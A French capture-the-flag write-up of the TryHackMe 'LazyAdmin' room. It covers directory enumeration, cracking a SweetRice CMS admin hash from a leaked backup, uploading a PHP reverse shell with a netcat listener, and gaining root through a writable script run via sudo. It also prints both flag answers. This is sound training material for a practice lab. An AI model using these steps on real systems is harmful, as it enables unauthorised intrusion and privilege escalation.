# TryHackMe: LazyAdmin

**Objectif :** enumerer le site, identifier SweetRice CMS, recuperer des credentials a partir d'un fichier de sauvegarde, exploiter l'upload arbitraire pour obtenir un shell web, puis elever les privileges via un script Perl execute avec sudo.

---

## Introduction

La room **LazyAdmin** est une machine Linux web orientee fundamentals. On y retrouve une chaine tres classique :

- brute force de repertoires
- identification d'un CMS
- recuperation d'identifiants depuis un backup oublie
- upload de shell
- privilege escalation via sudo mal pense

La room ne pose officiellement que deux questions, mais pour avoir un vrai writeup utile, il faut documenter toutes les etapes.

---

## Task 1: Lazy Admin

### Question 1: What is the user flag?

Avant de lire le flag, je reconstruis toute la compromission.

---

## Enumeration initiale

Je commence avec Nmap :

```bash
nmap -sC -sV -Pn <IP>
```

Le scan remonte deux ports ouverts :

- `22/tcp` - SSH
- `80/tcp` - HTTP

Le site par defaut sur le port 80 renvoie seulement la page Apache Ubuntu par defaut. Il faut donc passer a l'enumeration de repertoires.

```bash
gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirb/common.txt
```

Le repertoire cle qui ressort est :

```text
/content
```

En l'ouvrant, on voit rapidement des indices laissant penser a **SweetRice CMS**.

---

## Identification du CMS et collecte de credentials

En poursuivant l'enumeration sur `/content`, on tombe sur un fichier de sauvegarde ou des chemins de type :

```text
/content/inc/mysql_backup
```

Dans ce repertoire, un dump SQL ou un fichier de configuration contient un hash administrateur. En le cassant avec John, je recupere le mot de passe :

```text
Password123
```

Le compte administrateur utilise pour SweetRice est :

```text
manager
```

L'interface d'administration se trouve a :

```text
/content/as/
```

Je peux donc me connecter avec :

- utilisateur : `manager`
- mot de passe : `Password123`

---

## Exploitation: upload d'un shell web

Une fois dans l'admin SweetRice, la fonctionnalite d'upload de media suffit pour obtenir l'execution de code.

Je prepare un reverse shell PHP :

```bash
cp /usr/share/webshells/php/php-reverse-shell.php shell.php5
```

J'adapte mon IP et mon port, puis j'ouvre un listener :

```bash
rlwrap nc -lvnp 4444
```

J'upload ensuite le fichier via le Media Center de SweetRice. Une fois l'URL du fichier determinee, je l'appelle dans le navigateur pour declencher la connexion.

J'obtiens un shell en tant que :

```text
www-data
```

Je le stabilise :

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

---

## Recuperation du user flag

Je liste les homes :

```bash
ls /home
```

Le compte interessant est :

```text
itguy
```

Le premier flag se trouve dans son home :

```bash
cat /home/itguy/user.txt
```

### Reponse

**user.txt:** `THM{63e5bce9271952aad1113b6f1ac28a07}`

---

## Enumeration locale et privilege escalation

Je lance la commande standard :

```bash
sudo -l
```

La sortie est la suivante :

```text
(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

J'affiche ensuite le contenu du script :

```bash
cat /home/itguy/backup.pl
```

Le script execute :

```perl
system("sh", "/etc/copy.sh");
```

Je verifie alors les permissions de `/etc/copy.sh` :

```bash
ls -l /etc/copy.sh
cat /etc/copy.sh
```

Le point critique est que ce fichier est modifiable. Comme `backup.pl` s'executera en root via sudo, tout ce que j'ecris dans `/etc/copy.sh` s'executera avec les privileges root.

---

## Privilege Escalation

La technique la plus simple consiste a remplacer le contenu du script par un shell privilegie.

Exemple simple :

```bash
echo "/bin/bash -p" > /etc/copy.sh
sudo /usr/bin/perl /home/itguy/backup.pl
```

L'option `-p` permet a Bash de conserver les privileges effectifs.

Une autre approche consiste a y mettre un reverse shell root. Les deux fonctionnent. Ici, le shell local est plus propre.

Je confirme :

```bash
whoami
id
```

Puis je lis le second flag :

```bash
cat /root/root.txt
```

### Question 2: What is the root flag?

### Reponse

**root.txt:** `THM{6637f41d0177b6f37cb20d775124699f}`

---

## Resume des reponses de la room

- What is the user flag? `THM{63e5bce9271952aad1113b6f1ac28a07}`
- What is the root flag? `THM{6637f41d0177b6f37cb20d775124699f}`

---

## Commandes importantes

### Enumeration web

```bash
gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirb/common.txt
```

Permet de faire apparaitre `/content`, pivot principal de la machine.

### Crack du hash admin

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Fournit le mot de passe `Password123`.

### Reverse shell PHP

```bash
cp /usr/share/webshells/php/php-reverse-shell.php shell.php5
```

Transforme l'upload admin en execution de code.

### Enumeration sudo

```bash
sudo -l
```

Commande decisive pour trouver `backup.pl`.

### Abus du script execute en root

```bash
echo "/bin/bash -p" > /etc/copy.sh
sudo /usr/bin/perl /home/itguy/backup.pl
```

Privilege escalation immediate.

---

## Raisonnement complet

La room s'enchaine tres bien :

1. le site principal semble vide
2. un repertoire cache revele le CMS
3. un backup donne le credential admin
4. l'upload admin donne un shell web
5. `sudo -l` expose un script execute en root
6. ce script appelle un fichier modifiable
7. l'escalade devient triviale

Le point fort de la machine, c'est justement cette coherence.

---

## Conclusion

**LazyAdmin** est une machine courte, mais tres utile pour apprendre a exploiter un CMS mal tenu puis a relier cela a une mauvaise hygiene sudo locale. C'est un scenario simple, credible et tres formateur.

***Auteur*** *: Saad Idrissi*
